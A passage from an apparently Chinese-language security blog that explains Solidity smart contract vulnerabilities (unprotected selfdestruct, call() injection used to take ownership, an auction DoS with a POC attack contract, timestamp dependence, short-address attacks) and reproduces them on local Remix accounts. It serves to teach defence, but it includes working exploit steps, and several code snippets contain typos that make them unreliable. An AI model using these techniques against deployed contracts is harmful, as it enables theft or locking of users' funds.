+<h2 id="代码片段-1"><a href="#代码片段-1" class="headerlink" title="代码片段"></a>代码片段</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">destroycontract</span>(<span class="params">address _to</span>)</span>&#123;</span><br><span class="line">  selfdestruct(_to);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数是销毁合约的函数，但是却没有进行修饰，导致任何人都可以调用这个函数来销毁合约</p>
+<h2 id="代码调试-3"><a href="#代码调试-3" class="headerlink" title="代码调试"></a>代码调试</h2><p><a href="https://cn.etherscan.com/address/0xb5c0e43a6330b9eb904ec57ea24d70269ae4652e#code" target="_blank" rel="noopener">https://cn.etherscan.com/address/0xb5c0e43a6330b9eb904ec57ea24d70269ae4652e#code</a></p>
+<p>部署 Zapit  合约</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588218331646-f32fc00f-4381-4730-973a-593b18bc4234.png#align=left&display=inline&height=364&margin=%5Bobject%20Object%5D&name=image.png&originHeight=938&originWidth=1920&size=161680&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>先随便试试，是正常可用的</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588218429113-7c233cc9-4b2d-40b9-957b-e58dbf5e0272.png#align=left&display=inline&height=366&margin=%5Bobject%20Object%5D&name=image.png&originHeight=942&originWidth=1920&size=172940&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>用第二个账户销毁合约</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588218467106-d7c768fa-ba09-4a9a-ba1d-e656840d2e93.png#align=left&display=inline&height=365&margin=%5Bobject%20Object%5D&name=image.png&originHeight=939&originWidth=1920&size=175812&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>再看看已经没法用了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588218525391-e4064c67-413c-4f50-9c37-07129e514e41.png#align=left&display=inline&height=371&margin=%5Bobject%20Object%5D&name=image.png&originHeight=954&originWidth=1920&size=182568&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h2 id="漏洞防范-2"><a href="#漏洞防范-2" class="headerlink" title="漏洞防范"></a>漏洞防范</h2><p>对于敏感操作要严格控制权限，还是要仔细吧。。。</p>
+<h1 id="跨合约调用漏洞"><a href="#跨合约调用漏洞" class="headerlink" title="跨合约调用漏洞"></a>跨合约调用漏洞</h1><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>在 solidity 中合约之间的相互调用有两种方式：</p>
+<ul>
+<li>使用封装的方式，将合约地址封装成一个合约对象来调用它的函数</li>
+<li>直接使用函数来调用其他合约</li>
+</ul>
+<p>solidity 提供了 call()、delegatecall()、callcode() 三个函数来实现合约直接的调用及交互，这些函数的滥用导致了各种安全风险和漏洞。在使用第二种方式时，如果处理不当很可能产生致命的漏洞 —— 跨合约调用漏洞，主要就是 call() 注入函数导致的</p>
+<p>call() 函数对某个合约或者本地合约的某个方法的调用方式：</p>
+<ul>
+<li><address>.call(方法选择器,arg1,arg2,...)</li>
+<li><address>.call(bytes)
+
+</li>
+</ul>
+<p>通过传递参数的方式，将方法选择器、参数进行传递，也可以直接传入一个字节数组（bytes 要自己构造）</p>
+<p>举一个简单的例子</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">contract sample_1&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">info</span>(<span class="params">bytes data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.call(data);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">secret</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(<span class="keyword">this</span> == msg.sender);</span><br><span class="line">    <span class="comment">//secret operations</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>合约的两个函数中 secret 函数必须是合约自身调用的，然而有个 info 函数，调用了 call()，并且外界是可以直接控制 call 函数的字节数组的<br><code>this.call(bytes4(keccak256(&quot;secret()&quot;)));</code> 这样就调用了 secret</p>
+<p>第二个例子</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">contract sample2&#123;</span><br><span class="line"> ...</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">logAndCall</span>(<span class="params">address _to,uint _value,bytes data,string _fallback</span>)</span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  assert(_to.call(bytes4(keccak256(_fallback)),msg.sender,_value,_data));</span><br><span class="line">	...</span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在 logAndCall 函数中，我们的 _falback 参数可以控制，所以我们可以控制 _to 的任何方法。另外 assert 有三个参数，我们没必要调用完全符合三个参数类型的合约，因为在 EVM 中，只要找到了方法需要的参数，就会去执行，其他参数就会被忽略，不会产生任何影响</p>
+<h2 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transferFrom</span>(<span class="params">address _from,address _to,uint256 _amount,bytes _data,string_custom_fallback</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool success</span>)</span>&#123;</span><br><span class="line">  <span class="comment">//Alerts the token controller of the transfer</span></span><br><span class="line">  <span class="keyword">if</span>(isContract(controller))&#123;</span><br><span class="line">    <span class="keyword">throw</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">require</span>(<span class="keyword">super</span>.transferFrom(_from,_to,_amount));</span><br><span class="line">  <span class="keyword">if</span>(isContract(_to))&#123;</span><br><span class="line">    ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);</span><br><span class="line">    receiver.call.value(<span class="number">0</span>)(bytes4(keccack256(_custom_fallback)),_from,_amount,_data);</span><br><span class="line">  &#125;</span><br><span class="line">  ERC223Transfer(_from,_to,_amount,_data);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setOwner</span>(<span class="params">address owner_</span>) <span class="title">public</span> <span class="title">auth</span></span>&#123;</span><br><span class="line">  owner - owner_;</span><br><span class="line">  LogSetOwner(owner);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">modifier auth&#123;</span><br><span class="line">  <span class="built_in">require</span>(isAuthorized(msg.sender,msg.sig));</span><br><span class="line">  _;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAuthorized</span>(<span class="params">address src,bytes4 sig</span>) <span class="title">internal</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(src==address(<span class="keyword">this</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (src == owner)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (authority == DSAuthority(<span class="number">0</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> authority.canCall(src,<span class="keyword">this</span>,sig);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>核心漏洞代码片段</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transferFrom</span>(<span class="params">address _from,address _to,uint256 _amount,bytes _data,string_custom_fallback</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool success</span>)</span>&#123;</span><br><span class="line">  <span class="comment">//Alerts the token controller of the transfer</span></span><br><span class="line">  <span class="keyword">if</span>(isContract(controller))&#123;</span><br><span class="line">    <span class="keyword">throw</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">require</span>(<span class="keyword">super</span>.transferFrom(_from,_to,_amount));</span><br><span class="line">  <span class="keyword">if</span>(isContract(_to))&#123;</span><br><span class="line">    ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);</span><br><span class="line">    receiver.call.value(<span class="number">0</span>)(bytes4(keccack256(_custom_fallback)),_from,_amount,_data);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码含义：如果目标地址是智能合约，就调用目标的 <em>custom</em>  回退函数，并依次填入参数 _from，_amount，_data，这些都是我们可控的，另外 _to  参数也仅仅进行了是否是合约地址的判断，所以我们可以通过 _to  来控制合约本身，并调用该合约的任意  public  函数</p>
+<h2 id="代码调试-4"><a href="#代码调试-4" class="headerlink" title="代码调试"></a>代码调试</h2><p><a href="https://cn.etherscan.com/address/0x461733c17b0755ca5649b6db08b3e213fcf22546#code" target="_blank" rel="noopener">https://cn.etherscan.com/address/0x461733c17b0755ca5649b6db08b3e213fcf22546#code</a><br>由于这个合约的计算比较多，所以在 Gas limit  值加上个 0  让他大一点</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588253058296-0386e04f-ea4e-4a52-a368-9a917623a136.png#align=left&display=inline&height=365&margin=%5Bobject%20Object%5D&name=image.png&originHeight=939&originWidth=1920&size=151907&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>点击  owner  查看合约所有者的地址，返回了默认账户的地址  0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588253108925-4ef4eb81-ffa7-4a67-a62e-88fadd01eaf5.png#align=left&display=inline&height=366&margin=%5Bobject%20Object%5D&name=image.png&originHeight=941&originWidth=1920&size=165012&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>调用带有 _custom_fallback  参数的  transferFrom()  函数，我们的目的是让合约属于第二个账户，所以填写如下参数：</p>
+<ul>
+<li>_from  参数为第二个账户的地址</li>
+<li>_to  参数为合约地址</li>
+<li>_custom_fallback  参数为  setOwner()  函数</li>
+<li>另外两个参数随意</li>
+</ul>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588253720491-99f3592e-6def-43b7-b25a-303c028a4c8e.png#align=left&display=inline&height=322&margin=%5Bobject%20Object%5D&name=image.png&originHeight=643&originWidth=962&size=69417&status=done&style=stroke&width=481" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588253870482-2cb3ce13-0815-4d26-8ee0-fc3dfd254e8f.png#align=left&display=inline&height=366&margin=%5Bobject%20Object%5D&name=image.png&originHeight=941&originWidth=1920&size=178469&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>再看一下，合约所有者已经成了第二个账户的地址了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588253951709-23ecbec6-fb87-403f-9f0f-9df00da26e2b.png#align=left&display=inline&height=366&margin=%5Bobject%20Object%5D&name=image.png&originHeight=942&originWidth=1920&size=169202&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h2 id="漏洞防范-3"><a href="#漏洞防范-3" class="headerlink" title="漏洞防范"></a>漏洞防范</h2><p>虽然 call()、delegatecall()、callnode()  三个函数为合约间调用提供了很大的便利，但是存在很大隐患，所以防范跨合约调用漏洞的方法就是减少对这三个函数的使用。很多功能都可以用高级函数来实现</p>
+<h1 id="拒绝服务漏洞"><a href="#拒绝服务漏洞" class="headerlink" title="拒绝服务漏洞"></a>拒绝服务漏洞</h1><h2 id="漏洞概述-1"><a href="#漏洞概述-1" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>DoS（Denial of Service）漏洞，拒绝服务，在智能合约中，攻击者通过消耗资源，让用户短暂的（某些情况下永久地）退出不可操作的合约，从而把以太币锁在被攻击的合约中</p>
+<h2 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="在外部操纵映射或数组循环"><a href="#在外部操纵映射或数组循环" class="headerlink" title="在外部操纵映射或数组循环"></a>在外部操纵映射或数组循环</h3><p>这种攻击方式通常出现在合约所有者希望在其投资者之间分配代币，以及在合约中可以看到类似 distribute() 函数的情况</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">contract DistributeTokens&#123;</span><br><span class="line">  address public owner;</span><br><span class="line">  address[] investors;</span><br><span class="line">  uint[] investorTokens;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">invest</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span></span>&#123;</span><br><span class="line">    investors.push(msg.sender);</span><br><span class="line">    investorTokens.push(msg.value * <span class="number">5</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">distribute</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.sender == owner);</span><br><span class="line">    <span class="keyword">for</span>(uint i = <span class="number">0</span>;i&lt;investors.length;i++)&#123;</span><br><span class="line">      transferToken(investors[i],investorTokens[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>合约的循环遍历数组可以被人为扩充，攻击者可以创建多个账户，让 investors 的数据变得更大。理论上，攻击者可以执行 for 循环所需的 gas 数量超过区块 gas 上限，从而使得 distribute() 无法操作</p>
+<h3 id="所有者合约"><a href="#所有者合约" class="headerlink" title="所有者合约"></a>所有者合约</h3><p>所有者在合约中具有特定的权限，且必须执行一些任务，才能使合约进入下一个状态，例如 ICO 合约要求所有者使用 finalize() 方法签订合约，然后才能转移代币</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bool public isFinalized = <span class="literal">false</span>;</span><br><span class="line">address public owner;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">finalize</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">  <span class="built_in">require</span>(msg.sender = owner);</span><br><span class="line">  isFinalized == <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to,uint _value</span>) <span class="title">returns</span>(<span class="params">bool</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">require</span>(isFinalized);</span><br><span class="line">  <span class="keyword">super</span>.transfer(_to,_value)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果权限用户丢失，其私钥可能会变为非活动状态，于是代币合约就无法被操控。在这种情况下，如果 owner 无法调用 finalize() 函数，则代币无法转让，也就是说，代币系统的全部运作都取决于一个地址</p>
+<h3 id="基于外部调用的进展状态"><a href="#基于外部调用的进展状态" class="headerlink" title="基于外部调用的进展状态"></a>基于外部调用的进展状态</h3><p>有时候合约被编写成进入新的状态，需要将以太币发送到某个地址或者等待来自外部的某些输入。当外部调用失败或者由于外部原因而被阻止，也可能导致拒绝服务攻击<br>必须用户可以创建一个不接受以太币的合约，如果合约需要将以太币发到构建的这个合约才能进入新状态，那合约就永远不达到新状态</p>
+<h2 id="代码调试-5"><a href="#代码调试-5" class="headerlink" title="代码调试"></a>代码调试</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.22</span>;</span><br><span class="line">contract Auction&#123;</span><br><span class="line">    address public currentLeader;</span><br><span class="line">    uint256 public highestBid;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">bid</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span></span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.value &gt; highestBid);</span><br><span class="line">        <span class="built_in">require</span>(currentLeader.send(highestBid));</span><br><span class="line">        currentLeader = msg.sender;</span><br><span class="line">        highestBid = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract POC&#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    Auction public auInstance;</span><br><span class="line">    <span class="keyword">constructor</span>() public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier onlyOwner()&#123;</span><br><span class="line">        <span class="built_in">require</span>(owner==msg.sender);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setInstance</span>(<span class="params">address addr</span>) <span class="title">public</span> <span class="title">onlyOwner</span></span>&#123;</span><br><span class="line">        auInstance = Auction(addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> <span class="title">onlyOwner</span></span>&#123;</span><br><span class="line">        auInstance.bid.value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">payable</span></span>&#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>每当执行的  bid()  函数的时候，如果当前交易携带的以太币的数量大于 highestBid  的值，那么 highestBid  所对应的数量的以太币将被退回  currentLeader。设置当前竞拍者为  currentLeader，将  highestBid  改为  msg.value<br>在上面的 POC  合约中，setInstance()  函数将传入攻击对象合约，attack()  函数将加入拍卖机制关键还是回退函数（这里指 function() external payable  函数）。当新的  bider  参与竞标时，执行到  reauire(currentLeader.send(highestBid))  将会因为攻击合约的回退函数无法接受以太币返回 false，最终攻击合约以较少的以太币赢得竞标</p>
+<p>使用默认账户部署 Auction  合约，查看一下初始状态</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588257569720-4458e343-caf4-4286-8239-e21c88e18edd.png#align=left&display=inline&height=366&margin=%5Bobject%20Object%5D&name=image.png&originHeight=943&originWidth=1920&size=146076&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>使用 10 wei  拍下合约，然后再查看，会发现  currentLeader  已经成了默认账户</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588257665419-7b43279e-acea-49db-8cf5-2f00d802664b.png#align=left&display=inline&height=367&margin=%5Bobject%20Object%5D&name=image.png&originHeight=944&originWidth=1920&size=150267&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>使用第二个账户部署 POC  合约，然后复制第一个合约的地址，复制到  setInstance</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588257837637-2910658a-bf06-41ed-97a1-b55f1190665f.png#align=left&display=inline&height=366&margin=%5Bobject%20Object%5D&name=image.png&originHeight=943&originWidth=1920&size=153877&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>使用   第二个账户，设置为 20  个  value，然后点击  attack</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588258180681-093ceb73-c73e-41b4-9092-c48e716366ad.png#align=left&display=inline&height=366&margin=%5Bobject%20Object%5D&name=image.png&originHeight=943&originWidth=1920&size=157973&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>因为  attack()  会调用 Auction  合约的  bid()  函数，所以可以看到  Auction  合约的  currentLeader  已经成了第二个账户<br>即使其他用户再用更高的  wei  去竞标也会失败</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588258347758-3f0f1646-e299-4d47-b3f3-f50fccf67af7.png#align=left&display=inline&height=364&margin=%5Bobject%20Object%5D&name=image.png&originHeight=938&originWidth=1920&size=179651&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h2 id="漏洞防范-4"><a href="#漏洞防范-4" class="headerlink" title="漏洞防范"></a>漏洞防范</h2><p>函数应该加入异常处理机制</p>
+<h1 id="矿工特权隐患"><a href="#矿工特权隐患" class="headerlink" title="矿工特权隐患"></a>矿工特权隐患</h1><h2 id="漏洞概述-2"><a href="#漏洞概述-2" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>主要是指依赖时间戳的合约，比如一个抽奖的合约，会根据当前时间戳与一些其他的变量计算出来“幸运数”，如果参与者拥有幸运数相同的编码就可以拿到奖品，那么矿工在挖矿的过程中，可以提前尝试不同的时间戳，把奖品送给自己想送给的人</p>
+<h2 id="相关案例"><a href="#相关案例" class="headerlink" title="相关案例"></a>相关案例</h2><p>鉴于没法在 remix IDE 中复现，来说个案例，GovernMental 一个“庞氏骗局”合约会在一轮合约内向最后一个加入合约的玩家（需要至少加入一分钟）进行支付，因此，作为矿工的玩家可以调整时间戳，让合约以为该玩家已经加入超过一分钟了</p>
+<h1 id="短地址攻击"><a href="#短地址攻击" class="headerlink" title="短地址攻击"></a>短地址攻击</h1><h2 id="ABI-编码"><a href="#ABI-编码" class="headerlink" title="ABI 编码"></a>ABI 编码</h2><p>我们只看交易的信息<br><a href="https://cn.etherscan.com/tx/0x0213fb70e8174c5cbd9233a8e95905462cd7f1b498c12ff5e8ec071f4cc99347" target="_blank" rel="noopener">https://cn.etherscan.com/tx/0x0213fb70e8174c5cbd9233a8e95905462cd7f1b498c12ff5e8ec071f4cc99347</a></p>
+<p>看一下 input data</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588643515734-3d74b02e-8cb6-4535-a17b-825ac5d05835.png#align=left&display=inline&height=388&margin=%5Bobject%20Object%5D&name=image.png&originHeight=841&originWidth=1617&size=85844&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>如果能 Decode 以下的话就可以发现是下面这样的</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1588643221117-3b26649c-3549-43d1-b24e-cf4e4c0a8917.png#align=left&display=inline&height=435&margin=%5Bobject%20Object%5D&name=image.png&originHeight=944&originWidth=1620&size=87123&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>我用的是这个网站的 decode 功能，上面那个网站 decode 不了，以前一直以为这个网站凉了，原来是被凉了，搞不懂这个网站为啥也要 404<br><a href="https://etherscan.io/tx/0x0213fb70e8174c5cbd9233a8e95905462cd7f1b498c12ff5e8ec071f4cc99347" target="_blank" rel="noopener">https://etherscan.io/tx/0x0213fb70e8174c5cbd9233a8e95905462cd7f1b498c12ff5e8ec071f4cc99347</a></p>
+<p>对应着解释一下那一段十六进制字符串<br>0xa9059cbb0000000000000000000000000797350000000000000000000000000000000000000000000005150ac4c39a6f3f0000</p>
+<p>首先是前面四个字节  a9059cbb 这是用函数选择器计算出来的函数 ID： 用 bytes4(keccak256(“transfer(address,uint256)”)) 计算出来的</p>
+<p>后面 32 字节，是由目标地址的 20 字节地址  0797350000000000000000000000000000000000 组成的，不足位数前面需要补 0</p>
+<p>再往后就是转移的额度 _value 了，如果位数不足，就在前面补上一个 0，凑够 32 字节<br>这个貌似少了两位数</p>
+<h2 id="漏洞概述-3"><a href="#漏洞概述-3" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>短地址攻击就是发送比预期地址参数长度短的编码参数，例如只发送 38 个十六进制字符（19）字节的地址，而不是标准的 40 个字符（20）个字节，在这种情况下，EVM 会把金额前面 0 填充到编码参数的末尾，以达到预设长度</p>
+<p>用户常见一个空钱包比如：0x4b0897b0513fdc7c541b6d9d7e929c4e5364d200，把最后两个 0 去掉，作为收款地址来购买 1 个代币，EVM 会贴心的帮你用金额前面的 0 补上地址少的位数，但是这样金额长度又不够了，EVM 会继续贴心的在金额后面补上 0，直到补齐为止</p>
+<h2 id="代码调试-6"><a href="#代码调试-6" class="headerlink" title="代码调试"></a>代码调试</h2><p>鉴于 remix 会对地址格式进行检查，我们没法用他来做实验，但是可以用更底层的 geth 来试一下<br>（找到一个教育机构做的 <a href="http://remix.hubwiz.com/" target="_blank" rel="noopener">remix IDE</a> 国内 CDN 加速的，舒服！）</p>
